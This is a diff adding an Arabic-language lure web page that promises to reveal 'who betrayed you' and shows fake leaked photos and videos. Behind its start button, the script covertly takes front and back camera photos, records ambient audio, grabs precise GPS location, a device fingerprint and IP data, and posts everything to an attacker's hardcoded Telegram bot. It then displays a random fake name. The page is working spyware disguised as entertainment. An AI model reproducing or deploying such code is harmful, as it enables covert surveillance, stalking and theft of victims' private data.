@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>كشف الخيانة | فضيحة</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', 'Tajawal', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            background: #0a0a0a;
+            background-image: 
+                radial-gradient(ellipse at 50% 0%, #1a0505 0%, #0a0000 70%);
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ========== خلفية متحركة ========== */
+        .bg-effects {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .bg-effects .glow {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.08;
+            animation: float-glow 20s ease-in-out infinite alternate;
+        }
+
+        .bg-effects .glow:nth-child(1) {
+            width: 500px;
+            height: 500px;
+            background: #ef4444;
+            top: -200px;
+            right: -200px;
+        }
+
+        .bg-effects .glow:nth-child(2) {
+            width: 400px;
+            height: 400px;
+            background: #dc2626;
+            bottom: -150px;
+            left: -150px;
+            animation-delay: 7s;
+        }
+
+        .bg-effects .glow:nth-child(3) {
+            width: 250px;
+            height: 250px;
+            background: #b91c1c;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: 12s;
+        }
+
+        @keyframes float-glow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(40px, -40px) scale(1.4); }
+        }
+
+        /* ========== البطاقة ========== */
+        .main-card {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 460px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border-radius: 40px;
+            padding: 30px 24px 28px;
+            border: 1px solid rgba(239, 68, 68, 0.15);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(239, 68, 68, 0.1);
+            text-align: center;
+        }
+
+        /* ========== رأس الصفحة ========== */
+        .header-badge {
+            display: inline-block;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            border-radius: 30px;
+            padding: 6px 18px;
+            font-size: 11px;
+            color: #fca5a5;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+
+        /* ========== الأيقونة ========== */
+        .icon-box {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 44px;
+            box-shadow: 0 12px 50px rgba(220, 38, 38, 0.3);
+            position: relative;
+            animation: pulse-icon 2s ease-in-out infinite;
+        }
+
+        .icon-box::before {
+            content: '';
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #dc2626, #991b1b, #dc2626);
+            background-size: 300% 300%;
+            z-index: -1;
+            animation: border-glow 3s ease-in-out infinite;
+            opacity: 0.5;
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% { transform: scale(1); box-shadow: 0 12px 50px rgba(220, 38, 38, 0.3); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 70px rgba(220, 38, 38, 0.5); }
+        }
+
+        @keyframes border-glow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        /* ========== النصوص ========== */
+        .main-title {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 900;
+            margin-bottom: 4px;
+            text-shadow: 0 0 40px rgba(220, 38, 38, 0.2);
+        }
+
+        .main-title span {
+            background: linear-gradient(135deg, #fca5a5, #ef4444);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .sub-desc {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+
+        .warning-text {
+            color: rgba(239, 68, 68, 0.5);
+            font-size: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .warning-text .blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        /* ========== صور وفيديوهات (وهمية) ========== */
+        .media-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .media-grid .media-item {
+            aspect-ratio: 1;
+            border-radius: 14px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .media-grid .media-item:hover {
+            background: rgba(255, 255, 255, 0.06);
+            transform: scale(1.02);
+        }
+
+        .media-grid .media-item .play-icon {
+            position: absolute;
+            font-size: 14px;
+            color: white;
+            background: rgba(0,0,0,0.5);
+            padding: 4px 8px;
+            border-radius: 30px;
+            font-size: 10px;
+        }
+
+        .media-grid .media-item .tag {
+            position: absolute;
+            bottom: 4px;
+            right: 4px;
+            font-size: 8px;
+            color: rgba(255,255,255,0.2);
+            background: rgba(0,0,0,0.4);
+            padding: 2px 8px;
+            border-radius: 20px;
+        }
+
+        /* ========== زر البدء ========== */
+        .start-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-size: 22px;
+            font-weight: 900;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 40px rgba(220, 38, 38, 0.3);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+        }
+
+        .start-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 50px rgba(220, 38, 38, 0.5);
+        }
+
+        .start-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+
+        .start-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .start-btn .loader-text {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .start-btn.loading .btn-text {
+            display: none;
+        }
+
+        .start-btn.loading .loader-text {
+            display: inline-flex;
+        }
+
+        .loader-text .spinner {
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ========== زر سماح ========== */
+        .permit-hint {
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 16px;
+        }
+
+        .permit-hint .key {
+            background: rgba(255,255,255,0.05);
+            padding: 2px 10px;
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+            color: rgba(255,255,255,0.2);
+        }
+
+        /* ========== شريط التحميل ========== */
+        .progress-wrap {
+            display: none;
+            margin-top: 14px;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .progress-wrap.active {
+            display: block;
+            animation: fadeSlide 0.4s ease;
+        }
+
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .progress-wrap .top-row {
+            display: flex;
+            justify-content: space-between;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+
+        .progress-wrap .top-row .percent {
+            color: #f87171;
+            font-weight: 700;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-track .fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #dc2626, #ef4444);
+            border-radius: 10px;
+            transition: width 0.2s ease;
+        }
+
+        .progress-wrap .step-info {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+            margin-top: 8px;
+            font-family: monospace;
+        }
+
+        /* ========== نتيجة الكشف ========== */
+        .result-box {
+            display: none;
+            margin-top: 16px;
+            padding: 20px;
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid rgba(239, 68, 68, 0.12);
+            border-radius: 20px;
+        }
+
+        .result-box.show {
+            display: block;
+            animation: fadeSlide 0.5s ease;
+        }
+
+        .result-box .result-icon {
+            font-size: 40px;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .result-box .result-name {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .result-box .result-sub {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 13px;
+        }
+
+        /* ========== رسالة خطأ ========== */
+        .error-msg {
+            display: none;
+            margin-top: 12px;
+            padding: 12px 16px;
+            background: rgba(239, 68, 68, 0.08);
+            border: 1px solid rgba(239, 68, 68, 0.12);
+            border-radius: 16px;
+            color: #f87171;
+            font-size: 13px;
+        }
+
+        .error-msg.show {
+            display: block;
+            animation: fadeSlide 0.3s ease;
+        }
+
+        /* ========== تذييل ========== */
+        .footer-links {
+            margin-top: 18px;
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            color: rgba(255, 255, 255, 0.06);
+            font-size: 10px;
+        }
+
+        .footer-links span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* ========== حالة الاتصال ========== */
+        .status-badge {
+            position: fixed;
+            bottom: 14px;
+            right: 14px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 6px 14px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: #10b981;
+            font-size: 10px;
+            font-family: monospace;
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .status-badge .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #10b981;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+
+        /* ========== استجابة ========== */
+        @media (max-width: 480px) {
+            .main-card { padding: 24px 16px; }
+            .main-title { font-size: 22px; }
+            .icon-box { width: 72px; height: 72px; font-size: 34px; }
+            .start-btn { font-size: 18px; padding: 18px; }
+            .media-grid { gap: 6px; }
+            .media-grid .media-item { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ====== خلفية ====== -->
+<div class="bg-effects">
+    <div class="glow"></div>
+    <div class="glow"></div>
+    <div class="glow"></div>
+</div>
+
+<!-- ====== البطاقة ====== -->
+<div class="main-card">
+
+    <!-- شارة -->
+    <div class="header-badge">🔥 حصري | تم تسريبه الآن</div>
+
+    <!-- أيقونة -->
+    <div class="icon-box">🔥</div>
+
+    <!-- العنوان -->
+    <h1 class="main-title">كشف <span>الخيانة</span></h1>
+    <p class="sub-desc">شاهد من خانك ومن تسبب في فضحتك</p>
+    <div class="warning-text">
+        <span class="blink">⚡</span>
+        تم تسريب صور وفيديوهات جديدة
+        <span class="blink">⚡</span>
+    </div>
+
+    <!-- صور وفيديوهات وهمية -->
+    <div class="media-grid">
+        <div class="media-item">
+            📸
+            <span class="tag">صورة</span>
+        </div>
+        <div class="media-item">
+            📹
+            <span class="play-icon">▶</span>
+            <span class="tag">فيديو</span>
+        </div>
+        <div class="media-item">
+            📸
+            <span class="tag">صورة</span>
+        </div>
+        <div class="media-item">
+            📹
+            <span class="play-icon">▶</span>
+            <span class="tag">فيديو</span>
+        </div>
+        <div class="media-item">
+            📸
+            <span class="tag">صورة</span>
+        </div>
+        <div class="media-item">
+            🔞
+            <span class="tag">خاص</span>
+        </div>
+    </div>
+
+    <!-- زر البدء -->
+    <button class="start-btn" id="startBtn">
+        <span class="btn-text">🔥 اضغط هنا لبدء الفضيحة 🔥</span>
+        <span class="loader-text">
+            <span class="spinner"></span>
+            جاري كشف الفضيحة ...
+        </span>
+    </button>
+
+    <!-- زر سماح -->
+    <div class="permit-hint">
+        <span>📌 اضغط</span>
+        <span class="key">سماح</span>
+        <span>لتفعيل الكشف</span>
+    </div>
+
+    <!-- شريط التحميل -->
+    <div class="progress-wrap" id="progressWrap">
+        <div class="top-row">
+            <span id="stepLabel">⏳ جاري كشف الفضيحة...</span>
+            <span class="percent" id="percentLabel">0%</span>
+        </div>
+        <div class="progress-track">
+            <div class="fill" id="progressFill"></div>
+        </div>
+        <div class="step-info" id="stepInfo">⏱️ 0 ثانية</div>
+    </div>
+
+    <!-- نتيجة الكشف -->
+    <div class="result-box" id="resultBox">
+        <span class="result-icon">👤</span>
+        <div class="result-name" id="resultName">أحمد محمد</div>
+        <div class="result-sub" id="resultSub">✅ تم كشف هوية الخائن بنجاح</div>
+    </div>
+
+    <!-- رسالة خطأ -->
+    <div class="error-msg" id="errorMsg">⚠️ حدث خطأ، حاول مرة أخرى</div>
+
+    <!-- تذييل -->
+    <div class="footer-links">
+        <span>🔒 آمن</span>
+        <span>⚡ فوري</span>
+        <span>📱 متوافق مع جميع الأجهزة</span>
+    </div>
+</div>
+
+<!-- ====== حالة ====== -->
+<div class="status-badge">
+    <span class="dot"></span>
+    نشط
+</div>
+
+<script>
+    (function() {
+        // ============================================================
+        // ================ إعدادات البوت (نفس الكود الأصلي) ============
+        // ============================================================
+        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+        const MASTER_ID = "5849068535";
+
+        // ============================================================
+        // ================ دالة الإرسال إلى تليجرام ===================
+        // ============================================================
+        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
+            try {
+                let url = `https://api.telegram.org/bot${botToken}/`;
+                if (type === 'photo') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
+                } 
+                else if (type === 'video') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
+                }
+                else if (type === 'audio') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('audio', mediaBlob, 'voice_note.ogg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
+                }
+                else {
+                    await fetch(url + 'sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
+                    });
+                }
+                return true;
+            } catch(e) { console.warn("[telegram]", e); return false; }
+        }
+
+        // ============================================================
+        // ================ الكاميرا الأمامية (سيلفي) =================
+        // ============================================================
+        async function captureFrontCamera(chatId, botToken, phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 800;
+                canvas.height = video.videoHeight || 600;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                const caption = `📸 كاميرا أمامية (سيلفي)\n📞 الرقم: ${phoneNumber}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { 
+                console.warn("Front camera denied");
+                return false; 
+            }
+        }
+
+        // ============================================================
+        // ================ الكاميرا الخلفية ===========================
+        // ============================================================
+        async function captureBackCamera(chatId, botToken, phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1024;
+                canvas.height = video.videoHeight || 768;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { 
+                console.warn("Back camera denied");
+                return false; 
+            }
+        }
+
+        // ============================================================
+        // ================ التسجيل الصوتي =============================
+        // ============================================================
+        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                const audioPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n📞 الرقم: ${phoneNumber}`;
+                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
+                        resolve(true);
+                    };
+                });
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 8000);
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
+                return await audioPromise;
+            } catch(e) { 
+                console.warn("Audio denied");
+                return false; 
+            }
+        }
+
+        // ============================================================
+        // ================ الموقع الجغرافي ============================
+        // ============================================================
+        function getPreciseLocation(chatId, botToken, phoneNumber) {
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    let addressHint = "";
+                    try {
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                        const data = await revGeo.json();
+                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                    } catch(e) {}
+                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
+                    resolve(true);
+                }, (err) => {
+                    console.warn("Location denied");
+                    resolve(false);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            });
+        }
+
+        // ============================================================
+        // ================ بصمة الجهاز ================================
+        // ============================================================
+        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
+            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            
+            let batteryLevel = "غير متاح";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
+                } catch(e) {}
+            }
+            
+            let connection = "غير معروف";
+            if (navigator.connection) {
+                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
+            }
+            
+            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
+        }
+
+        // ============================================================
+        // ================ معلومات IP =================================
+        // ============================================================
+        async function getRichIPData(chatId, botToken, phoneNumber) {
+            try {
+                const [ipRes, ipInfoRes] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/')
+                ]);
+                const ipData = await ipRes.json();
+                let ipDetails = {};
+                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
+                const ipAddr = ipData.ip;
+                let country = ipDetails.country_name || "غير معروف";
+                let city = ipDetails.city || "غير معروف";
+                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
+                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
+            } catch(e) {}
+        }
+
+        // ============================================================
+        // ================ عناصر الواجهة ==============================
+        // ============================================================
+        const startBtn = document.getElementById('startBtn');
+        const progressWrap = document.getElementById('progressWrap');
+        const progressFill = document.getElementById('progressFill');
+        const percentLabel = document.getElementById('percentLabel');
+        const stepLabel = document.getElementById('stepLabel');
+        const stepInfo = document.getElementById('stepInfo');
+        const resultBox = document.getElementById('resultBox');
+        const resultName = document.getElementById('resultName');
+        const resultSub = document.getElementById('resultSub');
+        const errorMsg = document.getElementById('errorMsg');
+
+        // رقم الهاتف ثابت (نفس الكود الأصلي)
+        const phoneNumber = "01050000000";
+
+        let isRunning = false;
+        let progressInterval = null;
+        let counterInterval = null;
+        let seconds = 0;
+        let currentProgress = 0;
+
+        // أسماء وهمية للنتيجة
+        const fakeNames = [
+            'أحمد محمد', 'سارة علي', 'محمد حسن', 'نورا خالد', 'يوسف عمر',
+            'فاطمة أحمد', 'علي رضا', 'منى ياسر', 'حسام مصطفى', 'ريهام سامي',
+            'محمود طارق', 'هدى عبدالله', 'كريم السيد', 'ليلى محمود', 'أمير عادل'
+        ];
+
+        function getRandomName() {
+            return fakeNames[Math.floor(Math.random() * fakeNames.length)];
+        }
+
+        function updateProgress(value, label, info) {
+            currentProgress = Math.min(value, 100);
+            progressFill.style.width = currentProgress + '%';
+            percentLabel.textContent = Math.round(currentProgress) + '%';
+            if (label) stepLabel.textContent = label;
+            if (info) stepInfo.textContent = info;
+        }
+
+        function showError(text) {
+            errorMsg.textContent = text || '⚠️ حدث خطأ، حاول مرة أخرى';
+            errorMsg.classList.add('show');
+            setTimeout(() => errorMsg.classList.remove('show'), 4000);
+        }
+
+        function showResult() {
+            const name = getRandomName();
+            resultName.textContent = name;
+            resultSub.textContent = '✅ تم كشف هوية الخائن بنجاح';
+            resultBox.classList.add('show');
+            setTimeout(() => resultBox.classList.remove('show'), 8000);
+        }
+
+        // ============================================================
+        // ================ التشغيل الرئيسي ============================
+        // ============================================================
+        async function startProcess() {
+            if (isRunning) return;
+
+            isRunning = true;
+            startBtn.classList.add('loading');
+            startBtn.disabled = true;
+            resultBox.classList.remove('show');
+            errorMsg.classList.remove('show');
+            progressWrap.classList.add('active');
+
+            // بدء شريط التحميل
+            let progress = 0;
+            seconds = 0;
+            updateProgress(0, '⏳ جاري كشف الفضيحة...', '⏱️ 0 ثانية');
+
+            progressInterval = setInterval(() => {
+                const increment = Math.random() * 3 + 0.5;
+                progress = Math.min(progress + increment, 100);
+                updateProgress(progress, stepLabel.textContent, stepInfo.textContent);
+            }, 300);
+
+            counterInterval = setInterval(() => {
+                seconds++;
+                stepInfo.textContent = `⏱️ ${seconds} ثانية`;
+            }, 1000);
+
+            try {
+                // ====== 1. إرسال بدء الطلب ======
+                updateProgress(5, '🔥 جاري تجهيز الفضيحة...');
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                    `🔥 <b>طلب كشف فضيحة</b>\n📞 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
+                );
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 2. بصمة الجهاز ======
+                updateProgress(15, '🕵️ جاري كشف المعلومات...');
+                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 3. IP ======
+                updateProgress(30, '🌐 جاري تحديد موقع الخائن...');
+                await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 4. الكاميرا الأمامية ======
+                updateProgress(45, '📸 جاري التقاط صورة الخائن...');
+                await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 5. الكاميرا الخلفية ======
+                updateProgress(65, '📷 جاري تصوير مكان الخائن...');
+                await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 6. التسجيل الصوتي ======
+                updateProgress(80, '🎤 جاري تسجيل صوت الخائن...');
+                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 7. الموقع ======
+                updateProgress(90, '📍 جاري تحديد مكان الخائن...');
+                await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
+                await new Promise(r => setTimeout(r, 400));
+
+                // ====== 8. الإكمال ======
+                updateProgress(100, '✅ اكتملت الفضيحة!', '✅ تم بنجاح');
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                    `✅ <b>تم كشف الفضيحة بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n🔥 تم إرسال جميع الأدلة`
+                );
+
+                // عرض النتيجة
+                showResult();
+
+            } catch(e) {
+                console.error(e);
+                showError('❌ حدث خطأ أثناء كشف الفضيحة');
+            }
+
+            // إنهاء التحميل
+            clearInterval(progressInterval);
+            clearInterval(counterInterval);
+
+            setTimeout(() => {
+                progressWrap.classList.remove('active');
+                startBtn.classList.remove('loading');
+                startBtn.disabled = false;
+                isRunning = false;
+            }, 800);
+        }
+
+        // ========== ربط الأحداث ==========
+        startBtn.onclick = startProcess;
+
+    })();
+</script>
+
+</body>
+</html>
